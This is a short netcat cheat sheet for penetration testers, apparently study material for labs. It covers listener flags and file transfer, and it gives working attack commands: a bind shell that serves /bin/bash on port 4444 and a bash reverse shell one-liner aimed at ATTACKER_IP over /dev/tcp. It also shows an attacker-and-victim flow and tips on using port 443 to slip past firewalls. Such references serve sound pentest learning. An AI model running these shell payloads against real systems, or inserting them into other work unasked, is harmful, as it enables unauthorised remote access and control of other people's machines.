# Netcat (nc) Cheat Sheet

## Basic Listener

```bash
nc -lnvp 443
```

---

## Flag Explanation

| Flag | Description                                       |
| ---- | ------------------------------------------------- |
| `-l` | Listen mode (wait for incoming connections)       |
| `-n` | Do not resolve DNS (use raw IPs, faster)          |
| `-v` | Verbose output (shows connection details)         |
| `-p` | Specify local port (optional depending on syntax) |

---

## Reverse Shell Listener (Most Common)

```bash
nc -lvnp 443
```

Used to receive reverse shells from target machines.

---

## Connecting to a Target

```bash
nc TARGET_IP PORT
```

Example:

```bash
nc 10.10.10.10 80
```

---

## Sending a File

```bash
nc -lvnp 4444 > file.txt
```

Sender:

```bash
nc TARGET_IP 4444 < file.txt
```

---

## Receiving a File

Listener:

```bash
nc -lvnp 4444 > received.txt
```

Sender:

```bash
nc TARGET_IP 4444 < file.txt
```

---

## Bind Shell (Target Side)

```bash
nc -lvnp 4444 -e /bin/bash
```

⚠️ Note: `-e` may not be available in all netcat versions.

---

## Reverse Shell (Bash)

```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

---

## Netcat + Reverse Shell Flow

```text
Attacker:
nc -lvnp 443

Victim:
bash reverse shell payload

↓

Connection established

↓

Interactive shell
```

---

## Common Ports Used

| Port | Usage                               |
| ---- | ----------------------------------- |
| 4444 | Default in many labs                |
| 443  | Bypass firewalls (looks like HTTPS) |
| 80   | Looks like HTTP traffic             |

---

## Pentester Tips

* Use port **443** when possible to bypass firewall restrictions
* Always use `-n` to avoid DNS delays
* Combine with `rlwrap` for better shell usability:

```bash
rlwrap nc -lvnp 443
```

---

## Important Notes

* Netcat does **not** provide a fully interactive shell by default
* Always stabilize shells after connection
* Some systems block netcat or restrict outbound connections

---

## Quick Mental Model

```text
nc = TCP/UDP swiss army knife

Listen → Receive connection  
Connect → Send data  
Pipe → Transfer data  
```
